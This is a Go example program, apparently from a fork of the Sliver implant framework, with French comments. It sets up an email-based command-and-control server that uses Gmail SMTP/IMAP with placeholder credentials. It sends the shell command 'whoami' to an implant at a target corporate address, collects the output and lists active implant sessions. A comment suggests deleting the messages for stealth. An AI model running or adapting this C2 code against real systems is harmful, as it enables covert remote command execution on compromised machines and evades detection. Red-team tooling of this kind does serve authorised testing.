package main

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
	outlookc2 "github.com/bishopfox/sliver/server/c2/outlook"
)

func main() {
	// Générer ou charger la clé de chiffrement
	encKey, err := outlook.GenerateEncryptionKey()
	if err != nil {
		log.Fatalf("Failed to generate encryption key: %v", err)
	}

	fmt.Printf("Encryption Key (save this!): %s\n", outlook.KeyToHex(encKey))

	// Configuration du serveur C2
	config := &outlookc2.ServerConfig{
		// SMTP Configuration
		SMTPHost:     "smtp.gmail.com",
		SMTPPort:     587,
		SMTPUsername: "your-c2-email@gmail.com",
		SMTPPassword: "your-app-password",
		SMTPUseTLS:   true,

		// IMAP Configuration
		IMAPHost:     "imap.gmail.com",
		IMAPPort:     993,
		IMAPUsername: "your-c2-email@gmail.com",
		IMAPPassword: "your-app-password",
		IMAPUseTLS:   true,
		IMAPFolder:   "INBOX",

		// C2 Configuration
		C2Email:       "your-c2-email@gmail.com",
		EncryptionKey: encKey,
		PollInterval:  30 * time.Second,
		MarkAsRead:    true,
		DeleteAfter:   false, // Set to true for stealth
		Debug:         true,
	}

	// Créer le handler C2
	handler, err := outlookc2.NewOutlookC2Handler(config)
	if err != nil {
		log.Fatalf("Failed to create C2 handler: %v", err)
	}

	// Démarrer le handler
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := handler.Start(ctx); err != nil {
		log.Fatalf("Failed to start C2 handler: %v", err)
	}

	log.Println("[+] Outlook C2 Server started")
	log.Println("[+] Waiting for implant connections...")

	// Exemple : Envoyer une commande à un implant
	go func() {
		time.Sleep(10 * time.Second)

		implantEmail := "target-user@company.com"
		sessionID := "session-12345"
		command := "whoami"

		log.Printf("[*] Sending command '%s' to %s", command, implantEmail)

		taskID, err := handler.SendCommand(sessionID, implantEmail, command)
		if err != nil {
			log.Printf("[!] Error sending command: %v", err)
			return
		}

		log.Printf("[+] Command sent, task ID: %s", taskID)

		// Attendre le résultat (timeout 5 minutes)
		result, err := handler.WaitForTaskResult(sessionID, taskID, 5*time.Minute)
		if err != nil {
			log.Printf("[!] Error waiting for result: %v", err)
			return
		}

		log.Printf("[+] Result received:")
		log.Printf("    Task ID: %s", result.TaskID)
		log.Printf("    Success: %v", result.Success)
		log.Printf("    Output:\n%s", result.Result)
	}()

	// Attendre l'interruption
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)

	<-sigChan

	log.Println("\n[*] Shutting down...")

	// Arrêter le handler
	if err := handler.Stop(); err != nil {
		log.Printf("[!] Error stopping handler: %v", err)
	}

	// Afficher les sessions actives
	sessions := handler.ListSessions()
	log.Printf("[*] Active sessions: %d", len(sessions))
	for _, session := range sessions {
		log.Printf("  - Session: %s, Email: %s, Last Seen: %s",
			session.SessionID,
			session.ImplantEmail,
			session.LastSeen.Format(time.RFC3339))
	}

	log.Println("[+] Shutdown complete")
}
